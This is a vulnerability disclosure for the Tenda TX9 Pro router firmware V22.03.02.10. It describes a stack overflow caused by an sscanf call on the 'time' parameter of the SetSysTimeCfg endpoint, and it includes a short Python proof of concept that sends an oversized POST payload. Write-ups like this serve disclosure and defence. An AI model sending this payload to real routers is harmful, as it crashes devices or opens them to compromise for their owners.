## Overview

- Firmware download website: https://www.tendacn.com/download/detail-4219.html

## Affected version

TX9 Pro Firmware  V22.03.02.10

## Vulnerability details

The Tenda TX9 Pro Firmware  V22.03.02.10 firmware has a stack overflow vulnerability in the `sub_42D4DC` function. The `v2` variable receives the `timeType` parameter from a POST request and we let `v2=="sync"` to execute  `LABEL_3`. 

![image-20240416114101039](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114101039.png)

The `v7` variable receives the `time` parameter from a POST request. However, since the user can control the input of `time`, the statement `if ( sscanf(v7, " %d-%d-%d %d:%d:%d", &v14, &v13, &v12[12], &v12[8], &v12[4], v12) == 6 )` can cause a buffer overflow. The user-provided  `time` can exceed the capacity of the `v12~v14` array, triggering this security vulnerability.

![image-20240416114151064](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114151064.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetSysTimeCfg"
payload = b"a"*2000

data = {
        'timeType':'sync',
        'time':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
